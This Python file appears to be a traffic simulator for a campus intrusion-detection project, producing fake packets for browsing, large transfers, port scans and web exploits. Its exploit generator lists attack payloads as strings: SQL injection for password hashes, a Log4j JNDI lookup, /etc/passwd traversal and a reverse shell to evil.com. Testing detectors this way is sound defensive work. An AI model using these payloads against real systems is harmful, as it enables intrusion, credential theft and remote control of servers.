"""
SentinelEdge - Realistic Continuous Network Traffic & Threat Simulator
Generates continuous, authentic enterprise & college network traffic:
1. Normal user web browsing & DNS traffic
2. Genuine Heavy Data Transfers (Large file transfers on single port -> NOT BLOCKED)
3. External Hacker Port Scan (Probing empty ports on victim PC -> TERMINATED FOR 90s)
4. Web Exploit Injections (SQLi, Log4j payload)
"""

import time
import random
import threading
from typing import Dict, Any, Generator, Callable, Optional

# Subnets in Campus Network
SUBNETS = {
    "Lab-1": ["192.168.10.14", "192.168.10.45", "192.168.10.55", "192.168.10.89"],
    "Lab-2": ["192.168.20.12", "192.168.20.67", "192.168.20.104", "192.168.20.180"],
    "Lab-3": ["192.168.30.5",  "192.168.30.22", "192.168.30.77", "192.168.30.99"],
    "Admin_Servers": ["10.0.0.1", "10.0.0.5", "10.0.0.10"]
}

# Empty / unopened ports that attackers probe
EMPTY_PORTS_PROBED = [
    21, 23, 25, 69, 110, 135, 139, 445, 1433, 1521, 3306, 3389, 5432, 5900, 8000, 8081, 9000
]

class ContinuousTrafficGenerator:
    def __init__(self, on_packet_callback: Optional[Callable[[Dict[str, Any]], None]] = None):
        self.on_packet_callback = on_packet_callback
        self.running = False
        self._thread: Optional[threading.Thread] = None
        
        # State tracking for ongoing scenarios
        self.port_scan_active = False
        self.heavy_transfer_active = False
        self.attacker_ip = "198.51.100.42"
        self.victim_ip = "192.168.10.55"
        self.heavy_src_ip = "192.168.20.104"
        self.heavy_dst_ip = "10.0.0.10"

    def generate_normal_packet(self) -> Dict[str, Any]:
        """Standard student/faculty browsing or DNS lookup."""
        subnet = random.choice(["Lab-1", "Lab-2", "Lab-3"])
        src_ip = random.choice(SUBNETS[subnet])
        dst_ip = random.choice(SUBNETS["Admin_Servers"] + ["8.8.8.8", "1.1.1.1", "142.250.190.46"])
        port = random.choice([80, 443, 53, 8080])
        proto = "UDP" if port == 53 else "TCP"
        flags = "PA" if proto == "TCP" else ""
        
        return {
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "src_port": random.randint(30000, 65000),
            "dst_port": port,
            "protocol": proto,
            "flags": flags,
            "packet_len": random.randint(120, 800),
            "payload": "GET /index.html HTTP/1.1\r\nHost: portal.campus.edu\r\n\r\n" if port == 80 else "",
            "subnet": subnet,
            "sim_type": "NORMAL_TRAFFIC"
        }

    def generate_heavy_transfer_packet(self) -> Dict[str, Any]:
        """
        Genuine Heavy Data Transfer:
        High packet rate, large payload (1460 bytes MTU), but ONLY TARGETS A SINGLE PORT (e.g. 443).
        Demonstrates that legitimate data sharing is NOT terminated!
        """
        return {
            "src_ip": self.heavy_src_ip,
            "dst_ip": self.heavy_dst_ip,
            "src_port": 49152,
            "dst_port": 443,  # Strictly single port
            "protocol": "TCP",
            "flags": "A",    # Established ACK data stream
            "packet_len": 1460, # Full Ethernet MTU
            "payload": "DATA_BLOCK_" + ("A" * 128),
            "subnet": "Lab-2",
            "sim_type": "GENUINE_HEAVY_TRANSFER"
        }

    def generate_port_scan_packet(self) -> Dict[str, Any]:
        """
        External Hacker Port Scan:
        An external IP probes empty/unopened ports on an internal victim PC.
        Generates rapid SYN probes across 17+ empty ports.
        Must trigger dynamic 90-second IP termination!
        """
        target_port = random.choice(EMPTY_PORTS_PROBED)
        return {
            "src_ip": self.attacker_ip,
            "dst_ip": self.victim_ip,
            "src_port": random.randint(40000, 65000),
            "dst_port": target_port,
            "protocol": "TCP",
            "flags": "S", # Raw SYN probe
            "packet_len": 54, # Minimal TCP header
            "payload": "",
            "subnet": "External_WAN",
            "sim_type": "PORT_SCAN_ATTACK"
        }

    def generate_exploit_packet(self) -> Dict[str, Any]:
        """Simulates web exploit or SQL injection payload."""
        payload_options = [
            "GET /api/users?id=1 UNION SELECT username, password_hash FROM admin_users; --",
            "GET /search?q=${jndi:ldap://198.51.100.99/payload} HTTP/1.1",
            "GET /view?page=../../../../etc/passwd HTTP/1.1",
            "POST /exec HTTP/1.1\r\n\r\ncmd=/bin/sh -i >& /dev/tcp/evil.com/4444"
        ]
        return {
            "src_ip": "203.0.113.88",
            "dst_ip": "10.0.0.5",
            "src_port": random.randint(35000, 60000),
            "dst_port": 80,
            "protocol": "TCP",
            "flags": "PA",
            "packet_len": 320,
            "payload": random.choice(payload_options),
            "subnet": "External_WAN",
            "sim_type": "WEB_EXPLOIT"
        }

    def start_continuous(self, interval_sec: float = 0.15):
        """Starts continuous background traffic generation."""
        if self.running:
            return
        self.running = True
        self._thread = threading.Thread(target=self._run_loop, args=(interval_sec,), daemon=True)
        self._thread.start()
        print(f"[Traffic Generator] Continuous realistic network stream started (interval: {interval_sec}s).")

    def stop_continuous(self):
        self.running = False
        if self._thread:
            self._thread.join(timeout=1.0)
        print("[Traffic Generator] Continuous stream paused.")

    def trigger_burst(self, attack_type: str, count: int = 15):
        """Allows dashboard to inject a specific scenario burst on demand."""
        def burst_worker():
            for _ in range(count):
                if attack_type == "port_scan":
                    pkt = self.generate_port_scan_packet()
                elif attack_type == "heavy_transfer":
                    pkt = self.generate_heavy_transfer_packet()
                elif attack_type == "exploit":
                    pkt = self.generate_exploit_packet()
                else:
                    pkt = self.generate_normal_packet()

                if self.on_packet_callback:
                    self.on_packet_callback(pkt)
                time.sleep(0.04)

        threading.Thread(target=burst_worker, daemon=True).start()

    def _run_loop(self, interval_sec: float):
        packet_cycle = 0
        while self.running:
            packet_cycle += 1
            # Probability distribution for authentic network traffic:
            # - 70% Normal web/DNS traffic
            # - 20% Genuine heavy file transfer on single port
            # - 8% External hacker probing empty ports
            # - 2% Exploit attempts
            r = random.random()
            if r < 0.65:
                pkts = [self.generate_normal_packet()]
            elif r < 0.85:
                # Genuine heavy data transfer burst
                pkts = [self.generate_heavy_transfer_packet() for _ in range(3)]
            elif r < 0.95:
                # Real-world hacker empty-port scan burst: rapidly probes 6 distinct empty ports
                chosen_ports = random.sample(EMPTY_PORTS_PROBED, min(6, len(EMPTY_PORTS_PROBED)))
                pkts = []
                for p in chosen_ports:
                    pkt = self.generate_port_scan_packet()
                    pkt["dst_port"] = p
                    pkts.append(pkt)
            else:
                pkts = [self.generate_exploit_packet()]

            for pkt in pkts:
                if self.on_packet_callback:
                    try:
                        self.on_packet_callback(pkt)
                    except Exception as e:
                        print(f"[Traffic Generator] Callback error: {e}")
                time.sleep(0.02)

            time.sleep(interval_sec)

if __name__ == "__main__":
    # Test standalone execution
    import sys
    sys.path.append(".")
    from sentinel_core import SentinelEdgeCore
    
    core = SentinelEdgeCore()
    def printer(pkt):
        res = core.process_packet(pkt)
        print(f"[{res['decision']['action']:<10}] {pkt['sim_type']:<22} | {pkt['src_ip']} -> {pkt['dst_ip']}:{pkt['dst_port']} | {res['decision']['reason']}")

    gen = ContinuousTrafficGenerator(on_packet_callback=printer)
    print("Testing continuous realistic simulation for 5 seconds...")
    gen.start_continuous(interval_sec=0.1)
    time.sleep(5)
    gen.stop_continuous()
    print("Test completed.")
    print("Telemetry:", core.get_system_telemetry())
